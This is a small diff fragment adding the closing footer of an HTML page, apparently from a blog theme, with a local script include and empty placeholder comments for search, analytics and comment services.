+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
